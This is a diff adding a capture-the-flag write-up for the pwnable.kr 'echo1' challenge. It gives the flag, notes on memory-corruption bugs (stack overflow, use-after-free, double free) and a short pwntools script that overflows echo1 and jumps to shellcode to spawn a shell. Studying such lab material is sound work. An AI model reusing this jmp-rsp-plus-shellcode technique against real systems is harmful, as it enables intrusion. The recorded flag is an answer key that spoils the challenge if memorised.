@@ -1,0 +1,106 @@
+Flag:
+	H4d_som3_fun_w1th_ech0_ov3rfl0w
+
+
+You can use the `exit` option (option 4) to see the memory layout of the program - showing that the stack and the data segments are both RWX - we shellcoding.
+
+We write a shellcode on stack using `echo1`. We have a buffer overflow (in `echo1`), but we need a stack address to jump to it.
+
+Instead, I use the fixed address of the `id` global variable. In this, the first 4 bytes of the username are written. I write to it the bytes of `jmp $rsp`, and redirect execution to it using the buffer overflow. After that instruction is executed, execution is redirected to stack - without any stack address leak.
+
+
+All in all:
+
+from pwnlib import *
+context.context.update(arch='amd64')
+p = tubes.process.process(['nc', 'pwnable.kr', '9010'])
+p.send(asm.asm('jmp rsp') + b'\n')  # Username
+p.send(b'1\n')  # echo1 menu option
+p.send(b'\x00' * 40 + b'\xA0\x20\x60\x00\x00\x00\x00\x00' + asm.asm(shellcraft.sh()) + b'\n')  # Buffer overflow
+p.interactive()  # Profit
+
+
+
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Exploit:
+* First 4 bytes of username:
+	~ `jmp $esp+OffsetToShellcode`
+* Echo message:
+	~ First 32 bytes of whatever
+	~ Overwrite `retaddr` with address of `id`
+	~ Rest is shellcode
+	
+
+
+Summary:
+
+=====================================================================================
+Info					Meaning to us
+=====================================================================================
+-------------------------------------------------------------------------------------
+Heap & stack are RWX-able		We can run shellcode on both stack and heap
+-------------------------------------------------------------------------------------
+Stack overflow of 128 bytes of our	We can write shellcode and hijack return
+choice					address to it
+-------------------------------------------------------------------------------------
+Stack and heap locations are		We must leak an address to locate any
+randomized				malicious data we input
+-------------------------------------------------------------------------------------
+Use after free				Not sure, may be used for address leak	
+-------------------------------------------------------------------------------------
+Printing not-necessarily null-		Not sure, may be used for address leak	
+terminated username
+-------------------------------------------------------------------------------------
+We have a pointer to `username` on	May be used for trampolines and such
+heap, stored in a constant location
+-------------------------------------------------------------------------------------
+=====================================================================================
+
+Address leak is the only thing left:
+* If we have stack leak:
+	- Write shellcode on stack
+	- Hijack return address to it
+	- Profit
+* If we have heap leak:
+	- Write `jmp $esp+XX` as part of our username
+	- Wrtie shellcode on stack
+	- Hijack return address to username
+	- Profit
+
+We may also succeed with no address leak, if we utilize the data sections - whose addresses are fixed. We have `id` as an example to a fixed location to which our data is being written.
+We also have `name` pointed to by a constant location - `g_session`.
+
+A problem is that overriding the retval on stack also causes an overwrite of ebp.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Primitives:
+
+* Null-byte is added to `username` (should have been scanf("%23s"))
+	- `g_session->username` is not necessarily null-terminated
+	- stack byte is overwritten with '\0'
+
+* Double free of `g_session` (cleanup called before exiting for sure - line 61 in `main`)
+
+* Use After Free of `g_session` (cleanup called before exiting for sure - line 61 in `main`)
+	- Heap address leak?
+
+* Stack overflow at `echo1` (128 bytes read into a 32 byte `buffer`, line 6 in `echo1`)
+
+
+We can buffer overflow into a shellcode on stack, but we still need a stack leak.
+Or - we can use the heap leak to jump into heap and from there jump to $esp+X with no stack leak
+
+Indeed  - stack and heap seem to be RWX-able. Also other parts. Weird, many places are RWX-able here...
+But that must be for a reason - we jump to heap and then jump to stack.
+
+
+So heap leak using UAF does not work... we need other method of leaking an address.
+The double-4 weird proc/maps dump shows that stack and heap indeed are randomized!
